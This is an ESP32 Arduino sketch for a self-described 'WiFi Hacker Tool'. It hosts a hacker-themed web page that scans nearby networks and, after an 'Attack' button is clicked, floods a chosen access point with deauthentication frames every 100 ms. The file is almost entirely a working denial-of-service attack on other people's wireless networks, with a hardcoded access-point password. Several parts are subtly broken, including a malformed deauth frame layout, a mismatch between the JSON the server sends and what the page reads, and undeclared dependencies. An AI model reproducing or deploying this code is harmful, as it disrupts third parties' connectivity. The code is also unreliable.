#include <WiFi.h>
#include <ESPAsyncWebServer.h>
#include <SPIFFS.h>
#include <FS.h>

// Access Point Credentials
const char* ap_ssid = "bara";
const char* ap_password = "A7med@Elshab7";

// Web Server Setup
AsyncWebServer server(80);

// Network Scan Variables
int scanResult = 0;
unsigned long lastScanTime = 0;
const unsigned long scanInterval = 5000; // Scan every 5 seconds

// Deauthentication Variables
bool deauthActive = false;
String targetBssid = "";
int targetChannel = 1;

// HTML Content with Hacking Theme
const char index_html[] PROGMEM = R"rawliteral(
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>BARA - WiFi Hacker Tool</title>
    <style>
        body {
            font-family: 'Courier New', monospace;
            background-color: #0a0a0a;
            color: #ff3333;
            margin: 0;
            padding: 20px;
            overflow-x: hidden;
        }
        
        .container {
            max-width: 800px;
            margin: 0 auto;
            text-align: center;
        }
        
        h1 {
            color: #ff5555;
            text-shadow: 0 0 10px #ff0000;
            margin-bottom: 30px;
            animation: glow 2s infinite alternate;
        }
        
        @keyframes glow {
            from { text-shadow: 0 0 5px #ff0000; }
            to { text-shadow: 0 0 20px #ff0000, 0 0 30px #ff0000; }
        }
        
        .scan-button {
            background-color: #330000;
            border: 2px solid #ff3333;
            color: #ff3333;
            padding: 15px 30px;
            font-size: 18px;
            cursor: pointer;
            transition: all 0.3s;
            margin: 20px 0;
        }
        
        .scan-button:hover {
            background-color: #550000;
            box-shadow: 0 0 15px #ff0000;
        }
        
        .network-list {
            width: 100%;
            border-collapse: collapse;
            margin-top: 20px;
        }
        
        .network-list th,
        .network-list td {
            border: 1px solid #ff3333;
            padding: 12px;
            text-align: left;
        }
        
        .network-list tr:nth-child(even) {
            background-color: rgba(255, 51, 51, 0.1);
        }
        
        .network-list tr:hover {
            background-color: rgba(255, 51, 51, 0.3);
        }
        
        .attack-btn {
            background-color: #330000;
            border: none;
            color: #ff3333;
            padding: 8px 16px;
            cursor: pointer;
            transition: all 0.3s;
        }
        
        .attack-btn:hover {
            background-color: #550000;
            box-shadow: 0 0 10px #ff0000;
        }
        
        .status-indicator {
            display: inline-block;
            width: 12px;
            height: 12px;
            border-radius: 50%;
            margin-right: 8px;
        }
        
        .active {
            background-color: #ff3333;
            box-shadow: 0 0 10px #ff0000;
            animation: pulse 1s infinite;
        }
        
        .inactive {
            background-color: #444;
        }
        
        @keyframes pulse {
            0% { opacity: 1; }
            50% { opacity: 0.5; }
            100% { opacity: 1; }
        }
        
        .footer {
            margin-top: 40px;
            font-size: 14px;
            color: #888;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>BARA WiFi Hacker Tool</h1>
        <p>Developed by Ahmed Nour Ahmed | Qena</p>
        
        <button class="scan-button" onclick="startScan()">🔍 Scan Networks</button>
        
        <table class="network-list">
            <thead>
                <tr>
                    <th>BSSID</th>
                    <th>SSID</th>
                    <th>Signal</th>
                    <th>Channel</th>
                    <th>Action</th>
                </tr>
            </thead>
            <tbody id="networkTableBody">
                <!-- Networks will be populated here -->
            </tbody>
        </table>
        
        <div id="attackStatus" style="margin-top: 20px;">
            <span class="status-indicator inactive"></span>
            <span id="statusText">Ready</span>
        </div>
        
        <div class="footer">
            <p>BARA - Advanced WiFi Security Tool</p>
        </div>
    </div>

    <script>
        let networks = [];
        
        function startScan() {
            document.getElementById('statusText').textContent = 'Scanning...';
            fetch('/scan')
                .then(response => response.json())
                .then(data => {
                    networks = data.networks;
                    updateNetworkTable();
                    document.getElementById('statusText').textContent = 'Scan Complete';
                });
        }
        
        function updateNetworkTable() {
            const tbody = document.getElementById('networkTableBody');
            tbody.innerHTML = '';
            
            networks.forEach(network => {
                const row = document.createElement('tr');
                row.innerHTML = `
                    <td>${network.bssid}</td>
                    <td>${network.ssid || 'Hidden'}</td>
                    <td>${network.rssi} dBm</td>
                    <td>${network.channel}</td>
                    <td><button class="attack-btn" onclick="startAttack('${network.bssid}', ${network.channel})">💥 Attack</button></td>
                `;
                tbody.appendChild(row);
            });
        }
        
        function startAttack(bssid, channel) {
            if (confirm(`Start deauthentication attack on ${bssid}?`)) {
                fetch(`/attack?bssid=${bssid}&channel=${channel}`)
                    .then(() => {
                        document.getElementById('statusText').textContent = 'Attacking...';
                        document.querySelector('.status-indicator').classList.remove('inactive');
                        document.querySelector('.status-indicator').classList.add('active');
                    });
            }
        }
        
        // Auto-refresh scan every 30 seconds
        setInterval(startScan, 30000);
    </script>
</body>
</html>
)rawliteral";

void setup() {
    Serial.begin(115200);
    
    // Initialize SPIFFS
    if (!SPIFFS.begin(true)) {
        Serial.println("An error occurred while mounting SPIFFS");
        return;
    }

    // Set up Access Point
    WiFi.softAP(ap_ssid, ap_password);
    Serial.print("Access Point IP: ");
    Serial.println(WiFi.softAPIP());

    // Configure Web Server Routes
    server.on("/", HTTP_GET, [](AsyncWebServerRequest *request) {
        request->send_P(200, "text/html", index_html);
    });

    server.on("/scan", HTTP_GET, [](AsyncWebServerRequest *request) {
        String json = performScan();
        request->send(200, "application/json", json);
    });

    server.on("/attack", HTTP_GET, [](AsyncWebServerRequest *request) {
        if (request->hasParam("bssid") && request->hasParam("channel")) {
            targetBssid = request->getParam("bssid")->value();
            targetChannel = request->getParam("channel")->value().toInt();
            deauthActive = true;
            request->send(200, "text/plain", "Attack started");
        } else {
            request->send(400, "text/plain", "Missing parameters");
        }
    });

    server.begin();
}

void loop() {
    static unsigned long lastDeauthTime = 0;
    const unsigned long deauthInterval = 100; // Send deauth every 100ms
    
    if (deauthActive && millis() - lastDeauthTime > deauthInterval) {
        sendDeauthFrame(targetBssid.c_str(), targetChannel);
        lastDeauthTime = millis();
    }
}

String performScan() {
    int n = WiFi.scanNetworks(false, false, false, 100, nullptr);
    String json = "[";
    
    for (int i = 0; i < n; ++i) {
        if (i > 0) json += ",";
        json += "{";
        json += "\"bssid\":\"" + WiFi.BSSIDstr(i) + "\",";
        json += "\"ssid\":\"" + WiFi.SSID(i) + "\",";
        json += "\"rssi\":" + String(WiFi.RSSI(i)) + ",";
        json += "\"channel\":" + String(WiFi.channel(i));
        json += "}";
    }
    
    json += "]";
    return json;
}

void sendDeauthFrame(const char* bssid, int channel) {
    uint8_t deauthPacket[26] = {
        0xc0, 0x00, // Frame Control (Deauthentication)
        0x00, 0x00, // Duration
        0xff, 0xff, 0xff, 0xff, 0xff, 0xff, // Destination MAC (Broadcast)
        0x12, 0x34, 0x56, 0x78, 0x9a, 0xbc, // Source MAC (Random)
        0x00, 0x00, // Sequence Number
        0x07, 0x00  // Reason Code (Class 3 frame received from non-associated station)
    };

    // Replace destination MAC with target BSSID
    sscanf(bssid, "%02x:%02x:%02x:%02x:%02x:%02x",
           &deauthPacket[8], &deauthPacket[9], &deauthPacket[10],
           &deauthPacket[11], &deauthPacket[12], &deauthPacket[13]);

    // Set WiFi to target channel
    wifi_second_chan_t secondChan = WIFI_SECOND_CHAN_NONE;
    esp_wifi_set_channel(channel, secondChan);

    // Send deauth packet
    esp_wifi_80211_tx(WIFI_IF_AP, deauthPacket, sizeof(deauthPacket), false);
}
